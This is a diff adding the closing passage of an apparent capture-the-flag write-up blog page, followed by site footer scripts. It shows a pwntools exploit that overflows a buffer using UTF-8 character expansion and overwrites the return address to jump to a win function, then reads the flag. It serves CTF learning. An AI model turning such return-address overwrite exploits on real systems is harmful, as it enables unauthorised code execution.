+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Target Address: win + 5 (0x4011bb) để fix stack alignment</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Byte split: \xbb -&gt; UTF-8 &#39;»&#39; (\xc2\xbb)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solve</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 1. Bypass Reverse Logic</span>
+</span></span><span style="display:flex;"><span>    payload_bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 2. Bypass Wrapper Limit (Unicode Expansion)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 139 chars &#39;ÿ&#39; -&gt; 278 bytes padding</span>
+</span></span><span style="display:flex;"><span>    payload_bytes <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xc3\xbf</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">139</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 3. Unicode Split &amp; Stack Alignment Fix</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># \xc2: Padding vào RBP</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># \xbb: Ghi đè LSB của RIP thành 0xbb (nhảy vào win+5)</span>
+</span></span><span style="display:flex;"><span>    payload_bytes <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xc2\xbb</span><span style="color:#e6db74">&#39;</span> 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 4. Ghi phần còn lại của địa chỉ (0x4011...)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Bỏ qua byte đầu tiên vì đã ghi bằng \xbb</span>
+</span></span><span style="display:flex;"><span>    payload_bytes <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x4011bb</span>)[<span style="color:#ae81ff">1</span>:] 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        io <span style="color:#f92672">=</span> remote(HOST, PORT)
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;input (max 255 bytes): &#39;</span>)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendline(payload_bytes)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Payload sent, check shell</span>
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cat flag.txt&#39;</span>)
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    solve()
+</span></span></code></pre></div><p><strong>Flag: MSEC{6375_15_4pp4r3n7ly_n3v3r_54f3}</strong></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/p1c0L0.github.io/">p1c0L0</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a><canvas id="matrix-bg"></canvas>
+
+<style>
+     
+    #matrix-bg {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100vw; height: 100vh;
+        z-index: -9999;  
+        pointer-events: none;
+    }
+
+     
+    .emoji-reset {
+         
+        font-family: "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji", "Android Emoji", sans-serif !important;
+        
+         
+        color: initial !important; 
+        
+         
+        background: none !important; 
+        -webkit-text-fill-color: initial !important; 
+        -webkit-background-clip: border-box !important;
+
+         
+        text-shadow: none !important; 
+        
+         
+        font-style: normal !important;
+        display: inline-block !important;
+        font-weight: normal !important;
+    }
+</style>
+
+<script>
+    
+    const canvas = document.getElementById('matrix-bg');
+    const ctx = canvas.getContext('2d');
+
+    function resizeCanvas() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
+
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
+    const fontSize = 14;
+    const columns = Math.ceil(window.innerWidth / fontSize);
+    const drops = Array(columns).fill(1);
+
+    function draw() {
+        
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+        
+        ctx.fillStyle = 'rgba(0, 255, 65, 0.15)'; 
+        ctx.font = fontSize + 'px monospace';
+
+        for (let i = 0; i < drops.length; i++) {
+            const text = chars.charAt(Math.floor(Math.random() * chars.length));
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                drops[i] = 0;
+            }
+            drops[i]++;
+        }
+    }
+    
+    
+    ctx.fillStyle = '#000000';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    setInterval(draw, 35);
+
+
+    
+    document.addEventListener("DOMContentLoaded", function() {
+        
+        function rescueEmojis(node) {
+            
+            if (node.nodeType === 3) { 
+                const text = node.nodeValue;
+                
+                const emojiRegex = /[\p{Emoji_Presentation}\p{Extended_Pictographic}\u{1F300}-\u{1F6FF}\u{1F900}-\u{1F9FF}\u{2600}-\u{26FF}\u{2700}-\u{27BF}]/gu;
+                
+                if (text.match(emojiRegex)) {
+                    const span = document.createElement('span');
+                    
+                    span.innerHTML = text.replace(emojiRegex, '<span class="emoji-reset">$&</span>');
+                    node.parentNode.replaceChild(span, node);
+                }
+            } 
+            
+            else if (node.nodeType === 1 && 
+                     !['SCRIPT', 'STYLE', 'TEXTAREA', 'CODE', 'PRE'].includes(node.tagName) && 
+                     !node.classList.contains('emoji-reset')) {
+                Array.from(node.childNodes).forEach(child => rescueEmojis(child));
+            }
+        }
+        
+        
+        rescueEmojis(document.body);
+    });
+</script>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+</body>
+
+</html>
